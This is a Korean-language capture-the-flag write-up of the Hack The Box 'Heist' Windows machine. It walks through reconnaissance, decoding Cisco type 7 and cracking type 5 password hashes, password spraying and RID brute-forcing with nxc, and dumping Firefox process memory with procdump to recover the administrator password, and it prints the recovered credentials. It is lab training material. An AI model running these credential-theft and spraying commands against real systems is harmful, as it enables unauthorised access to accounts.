# HTB-HEIST
```bash
OS: Windows
DATE: 26.09.21
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 정찰을 위해 TCP 포트와 UDP 포트 검사를 진행했다.
```bash
nmap -p- -T4 IP
```
```bash
sudo nmap -sUV --top-ports 100 IP
```
UDP 포트는 없었고, TCP 전체 포트 검사를 통해 열린 포트를 확인한 후 상세 검사를 진행했다.
```bash
nmap -sC -sV -p 80,135,445,5985 IP
```
이를 통해 80(HTTP), 445(SMB), WinRM 서비스가 실행 중인 것을 알게 되었다. 가장 먼저 익명으로 SMB 접근이 가능한지 살펴보았지만 불가능했다.
```bash
smbclient -L //IP -N
```
따라서 HTTP 서비스의 웹 디렉토리와 서브도메인 bruteforce를 진행했다.
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r -e .php,.js,.txt,.html,.xml
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://IP/ -H "Host: FUZZ.IP" -fs 0
```
하지만 별다른 정보를 얻지 못했다.

## Initial Access
웹 서비스에 접속해본 결과 로그인 창이 가장 먼저 있었다. 기본 크리덴셜로 시도해본 결과 불가능하여 `login as Guest`로 사이트에 접속했다. 접속해본 결과 Hazard라는 유저가 **cisco configuration** 관련해서 supporter와 대화하는 페이지가 있었다. 따라서 Hazard 유저가 첨부한 파일을 살펴보았다. 내용은 이러하다.
```cisco
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```
cisco configuration 관련 정보에 대해 아는 것이 없어 구글에 검색해본 결과, `password 7`이 XOR 난독화되어 있다는 것을 알게 되어 cisco type7 cracker를 검색해본 결과 [**c7_decrypt**](https://github.com/derek-shnosh/c7_decrypt/blob/main/readme.md)라는 도구를 얻게 되었다. 따라서 rout3r, admin 유저의 type 7 인코딩된 문자열을 crack해보았다.
```bash
./c7_decrypt.py -s 0242114B0E143F015F5D1E161713
```
```bash
./c7_decrypt.py -s 02375012182C1A1D751618034F36415408
```
따라서 **$uperP@ssword**, **Q4)sJu\Y8qz*A3?d**라는 크리덴셜을 얻게 되어 웹사이트 로그인, SMB 접속, WinRM 접속을 시도했지만 모두 불가능했다. 따라서 위에 `enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91` 이 type5 해시를 crack해보기로 했다. 구글에 cisco type5 hashcat mode를 검색하여 hashcat mode 500이라는 것을 알게 되어 바로 crack을 시도했다.
```bash
hashcat -m 500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
따라서 **stealth1agent**라는 password도 얻을 수 있었다. 이제 우리가 아는 유저, 즉 admin, rout3r, hazard로 users list를 만들고, 우리가 아는 stealth1agent, Q4)sJu\Y8qz*A3?d, $uperP@ssword로 pass list를 만들었다. 이후 nxc를 사용하여 WinRM, SMB에 시도한 결과 hazard 유저로 접속이 가능했다.
```bash
nxc smb -u users -p pass 
```
따라서 이후 SMB에 접속했지만 특별한 것이 없었다. hazard 유저로는 WinRM을 통해 쉘을 얻을 수 없어, 다시 한 번 nxc를 통해 --users, --rid-brute를 시도한 결과 rid-brute로 Chase라는 유저와 Jason이라는 유저가 더 있다는 것을 알게 되었다.
```bash
nxc smb -u hazard -p 'stealth1agent' --rid-brute
```
따라서 user 리스트에 Chase와 Jason 유저를 추가하여 WinRM 접속 여부를 확인한 결과 Chase 유저로 접속이 가능하다는 것을 확인했다.
```bash
nxc winrm -u users -p pass
```
따라서 Chase 유저의 쉘을 얻을 수 있었다.
![user](attach_real/Pasted%20image%2020260921173217.png)

## Privilege Escalation
권한 상승을 위해 많은 것을 시도해보았다. 시도한 것 중 Get-Process를 통해 실행 중인 프로세스를 확인해본 결과 Firefox가 5개나 돌아가는 것을 알게 되었다. 프로그램을 실행하면 그 프로그램이 쓰는 모든 데이터가 RAM에 올라가기 때문에, Firefox에서 누군가 실행하고 남은 데이터를 이용하여 메모리 덤프를 시도했다. 따라서 procdump라는 tool을 다운로드했다. Firefox 메모리 덤프를 실행했다.
```bash
.\procdump64.exe -accepteula -ma 6472 firefox.dmp
```
여기서 나온 dmp 파일을 로컬로 옮겨 strings 툴을 사용하여 알아보기 쉬운 형태로 변환한 결과 admin의 평문 비밀번호를 얻을 수 있었다.
```bash
strings firefox.dmp
```
따라서 WinRM을 통해 admin 접속에 성공했다.
```bash 
evil-winrm -i IP -u administrator -p PASS
```
![admin](attach_real/Pasted%20image%2020260921183558.png)

## New Inform
- cisco IOS 비번 타입: type0 - 평문, type7 - XOR 난독화, type5 - MD5 hash
- 유저 하나를 얻었으면 다른 유저로 brute force를 시도해볼 것.
- 메모리 덤프: 컴퓨터가 프로그램을 실행하면 그 프로그램이 쓰는 모든 데이터가 RAM에 올라간다. Firefox에서 누군가 실행하고 남은 데이터를 덤프하는 것.
- procdump64.exe: 프로그램이 죽기 직전 procdump가 그 순간 메모리를 파일로 저장. -ma: memory all = 전체 메모리 다 덤프. -accepteula: 사용 약관 자동 동의 (없으면 팝업 뜨고 멈춤).